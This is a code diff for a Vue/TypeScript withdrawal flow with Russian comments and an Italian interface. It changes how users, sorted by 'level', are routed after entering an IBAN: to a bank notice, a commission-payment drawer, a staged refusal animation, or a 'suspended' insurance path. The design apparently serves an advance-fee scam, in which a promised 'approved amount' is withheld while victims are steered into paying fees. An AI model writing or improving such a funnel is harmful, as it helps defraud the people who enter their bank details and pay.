@@ -311,18 +311,25 @@ function openContractSign(): void {
 
 /**
  * Старт воронки после суммы.
- * L2: сразу animating + информационное окно банка (раньше анимация ждала
- * «Continua» — если dialog не открылся, L2 «не запускался»).
+ * L2: сразу animating + информационное окно банка.
+ * L4: анимация отказа (обязательно Home + phase animating).
  * L1 / fee → beginWithdraw → pay_fee → drawer комиссии.
- * L4 → анимация отказа.
  */
 function startWithdrawFunnel(): void {
-  if (level.value === 2) {
+  selectTab('home')
+  const lv = Number(level.value)
+
+  if (lv === 2) {
     beginWithdraw()
     bankNoticeOpen.value = true
     return
   }
-  beginWithdraw()
+
+  /* L4 (и запасной путь): анимация перевода */
+  const ok = beginWithdraw()
+  if (!ok && (lv === 2 || lv === 4) && phase.value === 'ready') {
+    beginWithdraw()
+  }
 }
 
 /**
@@ -384,9 +391,24 @@ function onWithdraw(): void {
   /* Анимация / policy / отказ — кнопки нет (VelPayoutCard.withdrawLocked). */
   if (!isReady.value) return
 
-  /* Toggle: повторный Preleva закрывает панель. */
+  /*
+   * Панель уже открыта: повторный Preleva = подтвердить (IBAN есть) и
+   * запустить воронку — НЕ просто свернуть (на L4 из‑за этого «ничего»).
+   */
   if (payoutPanelOpen.value) {
-    payoutPanelOpen.value = false
+    const hasIban = account.ibanFull.trim() !== '' || account.ibanProvided
+    if (hasIban) {
+      ensureWithdrawAmount()
+      const euros =
+        withdrawAmount.value > 0
+          ? withdrawAmount.value
+          : Math.round(approvedAmount.value)
+      if (euros > 0) {
+        continueAfterPayout(euros)
+        return
+      }
+    }
+    /* Форма не готова — оставляем панель открытой */
     return
   }
   payoutPanelOpen.value = true
@@ -394,11 +416,16 @@ function onWithdraw(): void {
 
 /** После панели или сразу (если IBAN есть) → drawer / анимация по уровню. */
 function continueAfterPayout(euros: number): void {
-  withdrawAmount.value = euros
+  withdrawAmount.value = Math.max(0, Math.round(euros))
+  if (withdrawAmount.value <= 0) {
+    ensureWithdrawAmount()
+  }
   payoutPanelOpen.value = false
 
+  const lv = Number(level.value)
+
   // L1 / L3 / страховка: pay_fee → drawer (IBAN-шаг пропускается, если уже есть).
-  if (level.value === 1 || level.value === 3 || isSuspended.value) {
+  if (lv === 1 || lv === 3 || isSuspended.value) {
     if (!isPayFee.value) beginWithdraw()
     commissionOpen.value = true
     return
